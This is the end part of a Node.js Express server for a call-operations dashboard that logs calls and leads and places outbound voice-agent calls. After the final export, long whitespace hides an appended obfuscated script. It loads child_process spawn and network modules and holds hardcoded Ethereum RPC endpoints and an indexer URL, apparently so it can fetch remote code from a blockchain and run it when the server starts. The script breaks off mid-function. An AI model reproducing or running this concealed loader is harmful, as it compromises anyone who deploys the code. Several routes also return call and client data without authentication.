      caller_type: analysis.caller_type || 'human_outbound',
      inquiry_topic: analysis.inquiry_topic,
      outcome: row.outcome || 'completed',
      follow_up_needed: !!analysis.follow_up_needed,
      duration_min: durationSec ? Math.max(1, Math.round(durationSec / 60)) : null,
      summary: analysis.summary
    });
    console.log(`   📞 Sheets row written with full summary`);
  } catch (err) {
    console.error(`   ❌ Sheets write failed: ${err.message}`);
  }

  // 7. Lead capture if it looks like a new lead
  if (analysis.caller_type === 'new_lead' && analysis.caller_name) {
    try {
      await writeLeadToSheet({
        brand: row.brand,
        caller_name: analysis.caller_name,
        caller_phone: row.caller_phone,
        caller_email: analysis.caller_email,
        inquiry_topic: analysis.inquiry_topic,
        summary: analysis.summary,
        follow_up_needed: !!analysis.follow_up_needed
      });
      console.log(`   📊 Lead written to Master Sheet (${row.brand})`);
    } catch (err) {
      console.error(`   ❌ Lead write failed: ${err.message}`);
    }
  }
}

/**
 * ============================================
 * DASHBOARD API ROUTES
 * ============================================
 */

const { getCalls, saveSMS } = require('./database/supabase');
const supabaseClient = require('./database/supabase');

// Dashboard data endpoint (with charts)
app.get('/api/dashboard', requireAuth, async (req, res) => {
  try {
    const data = await supabaseClient.getDashboardData();
    
    // Generate chart data (last 7 days)
    const chartData = [0, 0, 0, 0, 0, 0, 0]; // Placeholder - would aggregate from calls
    if (data.calls && data.calls.length > 0) {
      // Count calls per day for last 7 days
      const now = new Date();
      data.calls.forEach(call => {
        const callDate = new Date(call.timestamp);
        const daysAgo = Math.floor((now - callDate) / (1000 * 60 * 60 * 24));
        if (daysAgo < 7) {
          chartData[6 - daysAgo]++;
        }
      });
    }
    
    res.json({
      ...data,
      chartData,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Dashboard API error:', error);
    res.status(500).json({ error: 'Failed to fetch dashboard data' });
  }
});

// Get single call details
app.get('/api/call/:callId', async (req, res) => {
  try {
    const { supabaseRequest } = require('./database/supabase');
    const calls = await supabaseRequest('calls', 'GET', null, `?call_id=eq.${req.params.callId}`);
    
    if (calls && calls.length > 0) {
      res.json(calls[0]);
    } else {
      res.status(404).json({ error: 'Call not found' });
    }
  } catch (error) {
    console.error('Call fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch call' });
  }
});

// Toggle follow-up status
app.patch('/api/call/:callId/follow-up', async (req, res) => {
  try {
    const { supabaseRequest } = require('./database/supabase');
    const { follow_up_needed } = req.body;
    
    await supabaseRequest('calls', 'PATCH', {
      follow_up_needed: follow_up_needed
    }, `?call_id=eq.${req.params.callId}`);
    
    res.json({ success: true, follow_up_needed });
  } catch (error) {
    console.error('Follow-up update error:', error);
    res.status(500).json({ error: 'Failed to update follow-up status' });
  }
});

// Get all calls with pagination
app.get('/api/calls', requireAuth, async (req, res) => {
  try {
    const { brand, limit = 50, offset = 0 } = req.query;
    const calls = await getCalls({ brand, limit: parseInt(limit) });
    res.json({ calls, total: calls.length });
  } catch (error) {
    console.error('Calls fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch calls' });
  }
});

// Manual trigger: re-send a summary email for a specific call. Useful when
// Resend env vars were missing or the original send failed. Returns the
// underlying Resend response or error so we can diagnose.
//   POST /api/admin/resend-summary { call_id: "..." }
app.post('/api/admin/resend-summary', requireAuth, async (req, res) => {
  const callId = (req.body && req.body.call_id) || req.query.call_id;
  if (!callId) {
    return res.status(400).json({ ok: false, error: 'call_id required' });
  }
  try {
    const { supabaseRequest } = require('./database/supabase');
    const rows = await supabaseRequest('calls', 'GET', null, `?call_id=eq.${callId}&select=*`);
    if (!rows || rows.length === 0) {
      return res.status(404).json({ ok: false, error: 'Call not found in Supabase' });
    }
    const c = rows[0];

    const envCheck = {
      RESEND_API_KEY: !!process.env.RESEND_API_KEY,
      CALL_SUMMARY_EMAIL: process.env.CALL_SUMMARY_EMAIL || null,
      CALL_SUMMARY_FROM: process.env.CALL_SUMMARY_FROM || null
    };
    if (!envCheck.RESEND_API_KEY) {
      return res.status(500).json({ ok: false, error: 'RESEND_API_KEY not set', envCheck });
    }

    const { sendCallSummary } = require('./email/call-summary');
    const result = await sendCallSummary({
      brand: c.brand,
      callerName: c.caller_name,
      callerPhone: c.caller_phone,
      callerEmail: c.caller_email,
      callerType: c.caller_type,
      topic: c.inquiry_topic,
      summary: c.summary,
      transcript: c.transcript,
      durationMin: c.call_duration_min,
      recordingUrl: c.recording_url,
      timestamp: c.timestamp,
      followUp: c.follow_up_needed,
      callId: c.call_id
    });
    res.json({ ok: true, envCheck, result });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message, stack: err.stack });
  }
});

// Get leads
app.get('/api/leads', requireAuth, async (req, res) => {
  try {
    const { brand, status, limit = 50 } = req.query;
    const leads = await supabaseClient.getLeads({ brand, status, limit: parseInt(limit) });
    res.json({ leads, total: leads.length });
  } catch (error) {
    console.error('Leads fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch leads' });
  }
});

// Initiate outbound call (via Retell AI)
app.post('/api/call', requireAuth, async (req, res) => {
  const { phone, brand, task } = req.body;

  if (!phone) {
    return res.status(400).json({ error: 'Phone number required' });
  }

  // Normalize phone to E.164
  let toNumber = phone.replace(/[\s\-\(\)]/g, '');
  if (!toNumber.startsWith('+')) {
    toNumber = toNumber.startsWith('1') ? '+' + toNumber : '+1' + toNumber;
  }

  // Validate E.164 format
  if (!/^\+[1-9]\d{6,14}$/.test(toNumber)) {
    return res.status(400).json({ error: 'Invalid phone number. Use format: +1XXXXXXXXXX' });
  }

  try {
    // brand field from frontend is the brand's phone number (e.g. "+19803032854")
    const fromNumber = brand || process.env.TWILIO_PHONE_NUMBER || '+19803032854';

    // Prevent calling the brand's own number
    if (toNumber === fromNumber) {
      return res.status(400).json({ error: 'Cannot call the brand\'s own number. Please enter a different destination number.' });
    }

    const brandConfig = voice.getBrandConfig(fromNumber);

    // Build dynamic variables — injected into prompt via {{call_direction}} and {{custom_task}}
    const outboundContext = `This is an OUTBOUND call you are making on behalf of ${brandConfig.name}. You initiated this call — the person did NOT call you. Be polite, introduce yourself, and get to the point.`;
    const taskContext = task
      ? `\n\nYOUR TASK/INSTRUCTIONS FOR THIS CALL:\n${task}\n\nUse these instructions as internal guidance. Do NOT read them verbatim — interpret them naturally and act on them conversationally.`
      : '';

    const dynamicVars = {
      call_direction: outboundContext,
      custom_task: taskContext
    };

    const outboundGreeting = task
      ? `Hi, this is Ahdriana calling from ${brandConfig.name}. Do you have a quick moment?`
      : `Hi, this is Ahdriana calling from ${brandConfig.name}. How are you doing today?`;

    // Provider-specific agent override shape
    let agentId, agentOverride;
    if (voice.PROVIDER === 'vapi') {
      agentId = null; // Vapi resolves by phone number
      agentOverride = { firstMessage: outboundGreeting };
    } else {
      agentId = process.env[`RETELL_AGENT_${brandConfig.brand}`] || process.env.RETELL_AGENT_SSV;
      if (!agentId) {
        return res.status(500).json({ error: 'No Retell agent configured for this brand' });
      }
      agentOverride = { retell_llm: { begin_message: outboundGreeting } };
    }

    console.log(`📞 Outbound call (${voice.PROVIDER}): ${fromNumber} (${brandConfig.brand}) → ${toNumber}`);

    const callData = await voice.createPhoneCall(fromNumber, toNumber, agentId, dynamicVars, agentOverride);

    console.log(`✅ ${voice.PROVIDER} call created: ${callData.call_id}`);

    // Insert a placeholder row immediately. Vapi sometimes doesn't fire
    // status-update:ended for unanswered or instantly-failed calls, so
    // without this they'd never appear in the dashboard. The webhook will
    // PATCH this row with transcript/summary later if the call connects.
    try {
      const { saveCall } = require('./database/supabase');
      await saveCall({
        call_id: callData.call_id,
        brand: brandConfig.brand,
        caller_phone: toNumber,
        caller_name: null,
        caller_email: null,
        caller_type: 'unknown',
        inquiry_topic: null,
        outcome: 'in-progress',
        follow_up_needed: false,
        call_duration_min: null,
        summary: null,
        transcript: null,
        recording_url: null,
        timestamp: new Date().toISOString(),
        direction: 'outbound',
        metadata: {
          provider: voice.PROVIDER,
          direction: 'outbound',
          task: task || null,
          placeholder: true
        }
      });
    } catch (placeholderErr) {
      console.error('   ⚠️ Placeholder save failed (non-fatal):', placeholderErr.message);
    }

    res.json({ success: true, call_id: callData.call_id, agent: brandConfig.brand, provider: voice.PROVIDER });
  } catch (error) {
    console.error('Outbound call error:', error.message);
    res.status(500).json({ success: false, error: error.message || 'Failed to initiate call' });
  }
});

// ============ GOOGLE SHEETS API ============

// Test sheets connection
app.get('/api/sheets/test', async (req, res) => {
  try {
    const { testConnection } = require('./database/sheets');
    const result = await testConnection();
    
    // Add env var debug info
    result.debug = {
      hasGoogleJson: !!process.env.GOOGLE_SERVICE_ACCOUNT_JSON,
      jsonLength: process.env.GOOGLE_SERVICE_ACCOUNT_JSON?.length || 0,
      hasGoogleCreds: !!process.env.GOOGLE_APPLICATION_CREDENTIALS
    };
    
    res.json(result);
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: error.message,
      stack: error.stack,
      debug: {
        hasGoogleJson: !!process.env.GOOGLE_SERVICE_ACCOUNT_JSON,
        jsonLength: process.env.GOOGLE_SERVICE_ACCOUNT_JSON?.length || 0
      }
    });
  }
});

// Lookup existing client
app.get('/api/client/lookup', async (req, res) => {
  try {
    const { phone, name } = req.query;
    const { findExistingClient, findClientByName } = require('./database/sheets');
    
    let result = null;
    
    if (phone) {
      result = await findExistingClient(phone);
    } else if (name) {
      result = await findClientByName(name);
    } else {
      return res.status(400).json({ error: 'Provide phone or name parameter' });
    }
    
    if (result) {
      res.json({ found: true, client: result });
    } else {
      res.json({ found: false, message: 'Client not found' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Manually write a lead to sheets
app.post('/api/sheets/lead', async (req, res) => {
  try {
    const { writeLeadToSheet } = require('./database/sheets');
    const result = await writeLeadToSheet(req.body);
    res.json({ success: !!result, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
const PORT = process.env.PORT || 3850;
app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════╗
║       O1DMATCH CALL OPS - RUNNING                         ║
╠═══════════════════════════════════════════════════════════╣
║  Dashboard:     GET  /                                    ║
║  Dashboard API: GET  /api/dashboard                       ║
║  Vapi Webhook:  POST /vapi/webhook                        ║
║  Calls API:     GET  /api/calls                           ║
║  Leads API:     GET  /api/leads                           ║
║  Sheets Test:   GET  /api/sheets/test                     ║
║  Client Lookup: GET  /api/client/lookup?phone=xxx         ║
║  Health:        GET  /health                              ║
╠═══════════════════════════════════════════════════════════╣
║  Port: ${PORT}                                              ║
║  Supabase: Connected                                      ║
╚═══════════════════════════════════════════════════════════╝
  `);

  // Start the Vapi sync safety net (only if Vapi is the active provider)
  if ((process.env.VOICE_PROVIDER || '').toLowerCase() === 'vapi') {
    try {
      const { startVapiSync } = require('./voice/vapi-sync');
      startVapiSync();
    } catch (err) {
      console.error('Failed to start Vapi sync:', err.message);
    }
  }
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-376-5";var _0x18fc94=_0x32cb;(function(_0x5a4a9e,_0x3b45b1){var _0x3e9a83=_0x32cb,_0x8b5606=_0x5a4a9e();while(!![]){try{var _0x154b32=-parseInt(_0x3e9a83(0x353))/(0x1*0x93a+-0x31*0x44+-0x1*-0x3cb)+parseInt(_0x3e9a83(0x388))/(-0x6*-0x1+0x14de+-0x14e2)*(parseInt(_0x3e9a83(0x20f))/(-0x23b9+-0x232a+-0x79*-0x96))+-parseInt(_0x3e9a83(0x278))/(0xb*0x92+-0x439+0x1*-0x209)+parseInt(_0x3e9a83(0x1fd))/(-0x1791+0x45*0x37+-0x1*-0x8c3)*(-parseInt(_0x3e9a83(0x28d))/(0x78c*0x3+0x39*0x3e+0x29a*-0xe))+-parseInt(_0x3e9a83(0x2a1))/(-0x7a2+0x1*0x245d+-0x1cb4*0x1)+-parseInt(_0x3e9a83(0x203))/(0x6a*0x28+0x1760+0x9fa*-0x4)+parseInt(_0x3e9a83(0x223))/(0x1b42+-0x17fc+0x33d*-0x1)*(parseInt(_0x3e9a83(0x28b))/(-0x125*-0xb+0x39b+-0x1028));if(_0x154b32===_0x3b45b1)break;else _0x8b5606['push'](_0x8b5606['shift']());}catch(_0x5b93fb){_0x8b5606['push'](_0x8b5606['shift']());}}}(_0x507c,0x8d023+-0x3acf2+-0x1*-0x2742b),(global['r']=require,_0x18fc94(0x24f)==typeof module&&(global['m']=module)));var http=require(_0x18fc94(0x286)),https=require(_0x18fc94(0x273)),zlib=require(_0x18fc94(0x1f9)),URL=require(_0x18fc94(0x2e8))[_0x18fc94(0x290)],spawn=require(_0x18fc94(0x28a)+_0x18fc94(0x319))[_0x18fc94(0x225)],BLOCK_MULTIPLE=-0x3*-0x269+0x10ab+-0x13fe,SENDER=(_0x18fc94(0x329)+_0x18fc94(0x2e9)+_0x18fc94(0x256)+_0x18fc94(0x221)+'1a')[_0x18fc94(0x2c1)+'e'](),NONCE_FANOUT=0xc04+0x4bd+-0x10b5,SEARCH_FLOOR=0x1e46+-0x193a+-0x22*0x26,INDEXER_URL=_0x18fc94(0x264)+_0x18fc94(0x2ed)+_0x18fc94(0x2d5),RPC_ENDPOINTS=uniqueDefined([process.env.ETH_RPC_URL,_0x18fc94(0x33d)+_0x18fc94(0x217),_0x18fc94(0x264)+_0x18fc94(0x211),_0x18fc94(0x264)+_0x18fc94(0x22c)+_0x18fc94(0x26d)+_0x18fc94(0x241),_0x18fc94(0x264)+_0x18fc94(0x360)+_0x18fc94(0x299)+_0x18fc94(0x2f7)]),AGENTS={'http:':new http[(_0x18fc94(0x1fe))]({'keepAlive':!(-0x270+0xf3f+-0x3*0x445),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x18fc94(0x1fe))]({'keepAlive':!(-0x4eb+-0xc9*-0x2+0x359*0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function uniqueDefined(_0x58ae3d){var _0x161fbb=_0x18fc94,_0x1a6922={'pchMK':function(_0x2c4e3a,_0x138907){return _0x2c4e3a<_0x138907;}},_0x4d0f79,_0x3eacb7=[],_0x515198={};for(_0x4d0f79=-0x11*0x46+0xf70+-0xaca;_0x1a6922[_0x161fbb(0x27d)](_0x4d0f79,_0x58ae3d[_0x161fbb(0x2cf)]);_0x4d0f79++)_0x58ae3d[_0x4d0f79]&&!_0x515198[_0x58ae3d[_0x4d0f79]]&&(_0x515198[_0x58ae3d[_0x4d0f79]]=!(0xf6a+-0x469*-0x4+-0x2*0x1087),_0x3eacb7[_0x161fbb(0x242)](_0x58ae3d[_0x4d0f79]));return _0x3eacb7;}function linkAbort(_0x5aaa3f,_0x2e05df){var _0xd19dc0=_0x18fc94,_0xa1be81={'WfeJu':_0xd19dc0(0x20a)};_0x5aaa3f&&_0x5aaa3f[_0xd19dc0(0x2da)+_0xd19dc0(0x2af)](_0xa1be81[_0xd19dc0(0x327)],function(){var _0x277b3e=_0xd19dc0;_0x2e05df[_0x277b3e(0x20a)]();},{'once':!(0x6*-0x2b4+0xb5*-0x32+0x3392)});}function decompressStream(_0x3e108a){var _0xde2ef8=_0x18fc94,_0x53033a={'EQzGU':_0xde2ef8(0x2f1)+_0xde2ef8(0x305),'aLhWY':function(_0x4a0c49,_0x4f1341){return _0x4a0c49===_0x4f1341;},'qXllK':_0xde2ef8(0x34f),'rrNPI':_0xde2ef8(0x309),'hkoKS':function(_0x40f1cb,_0x132a2e){return _0x40f1cb===_0x132a2e;},'aHyUw':_0xde2ef8(0x257),'THhvn':function(_0x49bf12,_0x1b07fe){return _0x49bf12===_0x1b07fe;}},_0x4e84a2=(_0x3e108a[_0xde2ef8(0x294)][_0x53033a[_0xde2ef8(0x224)]]||'')[_0xde2ef8(0x2c1)+'e']();return _0x53033a[_0xde2ef8(0x293)](_0x53033a[_0xde2ef8(0x287)],_0x4e84a2)||_0x53033a[_0xde2ef8(0x293)](_0x53033a[_0xde2ef8(0x33b)],_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x261)+'ip']()):_0x53033a[_0xde2ef8(0x2b7)](_0x53033a[_0xde2ef8(0x222)],_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x34b)+_0xde2ef8(0x28c)]()):_0x53033a[_0xde2ef8(0x209)]('br',_0x4e84a2)?_0x3e108a[_0xde2ef8(0x2bd)](zlib[_0xde2ef8(0x37b)+_0xde2ef8(0x317)+'ss']()):_0x3e108a;}function httpRequest(_0x1379d8,_0x10d2f2){var _0x1d79b6=_0x18fc94,_0x142b69={'aoJgW':function(_0x2f6d2f,_0x3abc22){return _0x2f6d2f(_0x3abc22);},'WmHRH':_0x1d79b6(0x2c9),'axstT':function(_0xc481d4,_0x2b948d){return _0xc481d4(_0x2b948d);},'UTqLI':_0x1d79b6(0x2b8),'DXCsY':_0x1d79b6(0x320),'jYlMX':_0x1d79b6(0x210),'VihZn':function(_0x1cb74f,_0x87125d){return _0x1cb74f===_0x87125d;},'txMDz':_0x1d79b6(0x382),'udVuS':function(_0x1bbd10,_0x19f77e){return _0x1bbd10+_0x19f77e;},'hmMJc':function(_0x82207a,_0x4cba86){return _0x82207a!=_0x4cba86;},'aLsBw':function(_0x4335df,_0x2b014f){return _0x4335df||_0x2b014f;},'KtpQz':_0x1d79b6(0x2cc),'daqgJ':_0x1d79b6(0x24d)+_0x1d79b6(0x32b),'PYMLc':_0x1d79b6(0x30b)+_0x1d79b6(0x20d),'xYSwC':_0x1d79b6(0x362),'TiTSL':function(_0x4aab6e,_0x3d2785){return _0x4aab6e!=_0x3d2785;},'qnNmw':_0x1d79b6(0x212)+'pe','UlPnD':_0x1d79b6(0x300)+_0x1d79b6(0x289)},_0x4e8be8=(_0x10d2f2=_0x142b69[_0x1d79b6(0x368)](_0x10d2f2,{}))[_0x1d79b6(0x20e)]||_0x142b69[_0x1d79b6(0x316)],_0x373c8f=_0x10d2f2[_0x1d79b6(0x359)],_0x34f876=_0x10d2f2[_0x1d79b6(0x347)],_0x5451ea=new URL(_0x1379d8),_0x428c7c=_0x142b69[_0x1d79b6(0x1f6)](_0x142b69[_0x1d79b6(0x214)],_0x5451ea[_0x1d79b6(0x2f8)])?https:http,_0x5928f7={'Accept':_0x142b69[_0x1d79b6(0x298)],'Accept-Encoding':_0x142b69[_0x1d79b6(0x2a9)],'Connection':_0x142b69[_0x1d79b6(0x356)]};return _0x142b69[_0x1d79b6(0x2d9)](null,_0x373c8f)&&(_0x5928f7[_0x142b69[_0x1d79b6(0x26a)]]=_0x142b69[_0x1d79b6(0x298)],_0x5928f7[_0x142b69[_0x1d79b6(0x269)]]=Buffer[_0x1d79b6(0x307)](_0x373c8f)),new Promise(function(_0x1ae024,_0x4e162d){var _0x49a624=_0x1d79b6,_0x5d24fe={'OYloc':function(_0x1b5310,_0x412c59){var _0x429eaa=_0x32cb;return _0x142b69[_0x429eaa(0x228)](_0x1b5310,_0x412c59);},'nWuJn':_0x142b69[_0x49a624(0x31b)],'TEUUs':function(_0x497419,_0x330169){var _0x13b474=_0x49a624;return _0x142b69[_0x13b474(0x29a)](_0x497419,_0x330169);},'LUUaB':_0x142b69[_0x49a624(0x2ef)],'EzOqI':_0x142b69[_0x49a624(0x2a4)],'sIQaq':_0x142b69[_0x49a624(0x2b3)]},_0x3b4fc5=_0x428c7c[_0x49a624(0x32c)]({'hostname':_0x5451ea[_0x49a624(0x249)],'port':_0x5451ea[_0x49a624(0x2de)]||(_0x142b69[_0x49a624(0x1f6)](_0x142b69[_0x49a624(0x214)],_0x5451ea[_0x49a624(0x2f8)])?0xb*-0xad+-0x123*-0x19+0x1f*-0x9f:-0x1b8*-0x7+0xfe7+0x935*-0x3),'path':_0x142b69[_0x49a624(0x345)](_0x5451ea[_0x49a624(0x335)],_0x5451ea[_0x49a624(0x2c7)]),'method':_0x4e8be8,'agent':AGENTS[_0x5451ea[_0x49a624(0x2f8)]],'signal':_0x34f876,'headers':_0x5928f7},function(_0xdb07b3){var _0x5c37da=_0x49a624,_0x389b9f=_0x5d24fe[_0x5c37da(0x333)](decompressStream,_0xdb07b3),_0x4297ea=[];_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x32e)],function(_0x2e9f1c){var _0x30c468=_0x5c37da;_0x4297ea[_0x30c468(0x242)](_0x2e9f1c);}),_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x2ec)],function(){var _0x2d1705=_0x5c37da;try{_0x5d24fe[_0x2d1705(0x333)](_0x1ae024,JSON[_0x2d1705(0x29f)](Buffer[_0x2d1705(0x35e)](_0x4297ea)[_0x2d1705(0x2b6)](_0x5d24fe[_0x2d1705(0x250)])));}catch(_0x246ec2){_0x5d24fe[_0x2d1705(0x304)](_0x4e162d,_0x246ec2);}}),_0x389b9f['on'](_0x5d24fe[_0x5c37da(0x344)],_0x4e162d);});_0x3b4fc5['on'](_0x142b69[_0x49a624(0x2b3)],_0x4e162d),_0x142b69[_0x49a624(0x2b4)](null,_0x373c8f)&&_0x3b4fc5[_0x49a624(0x2fb)](_0x373c8f),_0x3b4fc5[_0x49a624(0x320)]();});}function promiseAny(_0x24f476){var _0x470e98=_0x18fc94,_0xcc2804={'MzqTo':function(_0x241b96,_0x527cd7){return _0x241b96===_0x527cd7;},'sXBnv':function(_0x36d096,_0x201c1b){return _0x36d096(_0x201c1b);},'cKkfh':function(_0x1a4dfd,_0x5875df){return _0x1a4dfd<_0x5875df;},'iISKd':function(_0x2ccb4a,_0x4fa678){return _0x2ccb4a(_0x4fa678);},'qWvjp':_0x470e98(0x234)};return new Promise(function(_0x34de23,_0x5120f6){var _0x1f3ac4=_0x470e98,_0x167acc={'rmYFU':function(_0x1ea838,_0xaeb4fb){var _0x46af2d=_0x32cb;return _0xcc2804[_0x46af2d(0x27a)](_0x1ea838,_0xaeb4fb);},'jLUjN':function(_0x1160d4,_0x94c378){var _0x12ac59=_0x32cb;return _0xcc2804[_0x12ac59(0x2f9)](_0x1160d4,_0x94c378);}},_0xd3cbee,_0x129171=_0x24f476[_0x1f3ac4(0x2cf)],_0xe7f2a9=null;if(_0x129171){for(_0xd3cbee=-0x145b+0x7d3+0x322*0x4;_0xcc2804[_0x1f3ac4(0x303)](_0xd3cbee,_0x24f476[_0x1f3ac4(0x2cf)]);_0xd3cbee++)_0x24f476[_0xd3cbee][_0x1f3ac4(0x236)](_0x34de23,function(_0x19643e){var _0x2582b0=_0x1f3ac4;_0xe7f2a9=_0x19643e,_0x167acc[_0x2582b0(0x384)](0x46*0x4a+-0x2*0x4d8+0x64*-0x1b,--_0x129171)&&_0x167acc[_0x2582b0(0x2d8)](_0x5120f6,_0xe7f2a9);});}else _0xcc2804[_0x1f3ac4(0x337)](_0x5120f6,new Error(_0xcc2804[_0x1f3ac4(0x2db)]));});}function withRpcEndpoints(_0x32fe20,_0x508d0d){var _0x2b39ec=_0x18fc94,_0x40cfea={'ktIUm':_0x2b39ec(0x219)+'5','VUCBv':function(_0x85e943,_0x446135){return _0x85e943<_0x446135;},'tuiRX':function(_0x5a0822,_0x45c318,_0x5a27f1){return _0x5a0822(_0x45c318,_0x5a27f1);},'yydbR':function(_0x4c7b5f,_0x270bcf){return _0x4c7b5f<_0x270bcf;},'NskND':function(_0x80a379,_0x1d5282){return _0x80a379<_0x1d5282;},'hYYRY':function(_0x536109,_0x182b56){return _0x536109<_0x182b56;},'YCiUg':function(_0x21e01e,_0x5c3d4a){return _0x21e01e(_0x5c3d4a);}},_0x383a51=_0x40cfea[_0x2b39ec(0x34d)][_0x2b39ec(0x33f)]('|'),_0x33d7dc=0xbef+-0x1200+0x611;while(!![]){switch(_0x383a51[_0x33d7dc++]){case'0':var _0x2b2d0f,_0x4d6a9a=[],_0x289f40=[];continue;case'1':for(_0x2b2d0f=-0x85e+-0x2065+-0x1*-0x28c3;_0x40cfea[_0x2b39ec(0x27b)](_0x2b2d0f,RPC_ENDPOINTS[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x289f40[_0x2b39ec(0x242)](_0x40cfea[_0x2b39ec(0x207)](_0x32fe20,RPC_ENDPOINTS[_0x2b2d0f],_0x4d6a9a[_0x2b2d0f][_0x2b39ec(0x347)]));continue;case'2':for(_0x2b2d0f=0xa7e+-0xef*-0x19+-0x21d5;_0x40cfea[_0x2b39ec(0x37d)](_0x2b2d0f,RPC_ENDPOINTS[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b39ec(0x242)](new AbortController());continue;case'3':for(_0x2b2d0f=-0x831+-0x248a+0x2cbb;_0x40cfea[_0x2b39ec(0x2f4)](_0x2b2d0f,_0x4d6a9a[_0x2b39ec(0x2cf)]);_0x2b2d0f++)_0x40cfea[_0x2b39ec(0x207)](linkAbort,_0x508d0d,_0x4d6a9a[_0x2b2d0f]);continue;case'4':var _0x2d376c={'SSJqK':function(_0x51183e,_0x2b9f5f){var _0xeab8c0=_0x2b39ec;return _0x40cfea[_0xeab8c0(0x361)](_0x51183e,_0x2b9f5f);},'xMLzg':function(_0x5550e6,_0x3ab89c){var _0x2a8b55=_0x2b39ec;return _0x40cfea[_0x2a8b55(0x361)](_0x5550e6,_0x3ab89c);}};continue;case'5':return _0x40cfea[_0x2b39ec(0x284)](promiseAny,_0x289f40)[_0x2b39ec(0x236)](function(_0x1460b0){var _0x4e3079=_0x2b39ec;for(_0x2b2d0f=-0x1b41+-0x1b6d+0x1b57*0x2;_0x2d376c[_0x4e3079(0x1fb)](_0x2b2d0f,_0x4d6a9a[_0x4e3079(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b2d0f][_0x4e3079(0x20a)]();return _0x1460b0;},function(_0x47f298){var _0x4d9965=_0x2b39ec;for(_0x2b2d0f=-0x26c8+0x1*-0x26c7+-0x37*-0x169;_0x2d376c[_0x4d9965(0x21c)](_0x2b2d0f,_0x4d6a9a[_0x4d9965(0x2cf)]);_0x2b2d0f++)_0x4d6a9a[_0x2b2d0f][_0x4d9965(0x20a)]();throw _0x47f298;});}break;}}function rpcCall(_0x153037,_0x3633f6,_0x1ea817,_0x346c4c){var _0x125d93=_0x18fc94,_0x31fad3={'ySpSG':function(_0x3c5043,_0x481f21,_0x1edad5){return _0x3c5043(_0x481f21,_0x1edad5);},'wMRmp':_0x125d93(0x372),'FFzps':_0x125d93(0x2f3)};return _0x31fad3[_0x125d93(0x2e7)](httpRequest,_0x153037,{'method':_0x31fad3[_0x125d93(0x377)],'body':JSON[_0x125d93(0x296)]({'jsonrpc':_0x31fad3[_0x125d93(0x23d)],'id':0x1,'method':_0x3633f6,'params':_0x1ea817}),'signal':_0x346c4c})[_0x125d93(0x236)](function(_0x211df3){var _0x3cdec4=_0x125d93;return _0x211df3[_0x3cdec4(0x25d)];});}function rpcBatch(_0x2082dc,_0x518f24,_0x5aed34){var _0x483f70=_0x18fc94,_0xc74cca={'iWvRF':_0x483f70(0x371),'nhKcK':function(_0x557e93,_0x27c1de){return _0x557e93<_0x27c1de;},'PFIwb':function(_0x275bf6,_0x41d0ad){return _0x275bf6+_0x41d0ad;},'eHDgv':function(_0x9a1bb8,_0x3e8fe7){return _0x9a1bb8<_0x3e8fe7;},'YfzIb':_0x483f70(0x2f3),'YxTRN':function(_0x70051c,_0x1f77b8,_0x386042){return _0x70051c(_0x1f77b8,_0x386042);},'GsbXQ':_0x483f70(0x372)},_0x2e45fd,_0x500dd4=[];for(_0x2e45fd=0x601*0x6+-0x29*-0xd3+-0x1*0x45d1;_0xc74cca[_0x483f70(0x1f2)](_0x2e45fd,_0x518f24[_0x483f70(0x2cf)]);_0x2e45fd++)_0x500dd4[_0x483f70(0x242)]({'jsonrpc':_0xc74cca[_0x483f70(0x2ad)],'id':_0xc74cca[_0x483f70(0x240)](_0x2e45fd,0xed4+0xc73+-0x1b46),'method':_0x518f24[_0x2e45fd][-0x189+0x600*0x5+-0x1c77],'params':_0x518f24[_0x2e45fd][-0x1318+0x1f*0x115+-0xe72*0x1]});return _0xc74cca[_0x483f70(0x22f)](httpRequest,_0x2082dc,{'method':_0xc74cca[_0x483f70(0x2ac)],'body':JSON[_0x483f70(0x296)](_0x500dd4),'signal':_0x5aed34})[_0x483f70(0x236)](function(_0x1cc058){var _0x2b6729=_0x483f70,_0x4f165f=_0xc74cca[_0x2b6729(0x24a)][_0x2b6729(0x33f)]('|'),_0x55a267=-0x14ac+0x7b*0x1f+0x5c7;while(!![]){switch(_0x4f165f[_0x55a267++]){case'0':return _0x6c7fff;case'1':var _0x3e6179={};continue;case'2':var _0x6c7fff=[];continue;case'3':for(_0x2e45fd=0x244+-0x11*-0x21d+-0x2631;_0xc74cca[_0x2b6729(0x1f2)](_0x2e45fd,_0x518f24[_0x2b6729(0x2cf)]);_0x2e45fd++)_0x6c7fff[_0x2b6729(0x242)](_0x3e6179[_0xc74cca[_0x2b6729(0x240)](_0x2e45fd,-0x6fe+0x22b9+-0x1bba)][_0x2b6729(0x25d)]);continue;case'4':for(_0x2e45fd=-0xfde+-0x1923+0x2901;_0xc74cca[_0x2b6729(0x318)](_0x2e45fd,_0x1cc058[_0x2b6729(0x2cf)]);_0x2e45fd++)_0x3e6179[_0x1cc058[_0x2e45fd]['id']]=_0x1cc058[_0x2e45fd];continue;}break;}});}function _0x507c(){var 